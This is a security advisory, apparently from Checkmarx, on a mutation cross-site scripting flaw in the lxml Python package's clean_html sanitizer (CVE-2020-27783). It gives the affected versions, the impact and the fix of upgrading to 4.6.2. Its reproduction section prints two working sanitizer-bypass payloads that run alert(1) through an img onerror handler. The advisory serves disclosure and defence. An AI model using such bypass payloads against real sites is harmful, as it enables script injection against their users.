---
title: Mutation Cross-Site Scripting in lxml
date: 2020-11-27
tags:
	- "python"
	- "xss"
	- "mxss"
advisory: true
origin: https://advisory.checkmarx.net/advisory/CX-2020-4286/
cves:
	- "CVE-2020-27783"
---
## Summary
The lxml python package is vulnerable to mXSS due to the use of improper parser. The parser used doesn't imitate browsers, which causes different behaviors between the sanitizer and the user's page. This can result in an arbitrary HTML/JS code execution.

## Product
lxml from 1.2 up to 4.6.1

## Impact
Using lxml as a sanitizer might not fulfill its purpose. 

## Steps to reproduce
```
>>> from lxml.html.clean import clean_html
>>> clean_html('<svg><style><img src=x onerror=alert(1)></style></svg>')
>>> clean_html('<noscript><style><a title="</noscript><img src=x onerror=alert(1)>">')
```

### Expected result:
```<svg><style><img src=x onerror=alert(1)></style></svg>```
And
```<noscript><style><a title="</noscript><img src=x onerror=alert(1)>"></style></noscript>```

## Remediation
Update lxml dependency to 4.6.2 or above.

## Credit
This issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).

## Resources
1. [Advisory](https://github.com/advisories/GHSA-pgww-xf46-h92r)
2. Initial commit [89e7aad](https://github.com/lxml/lxml/commit/89e7aad6e7ff9ecd88678ff25f885988b1)
3. Additional commit [a105ab8](https://github.com/lxml/lxml/commit/a105ab8dc262ec6735977c25c13f0bdfcdec72a7)
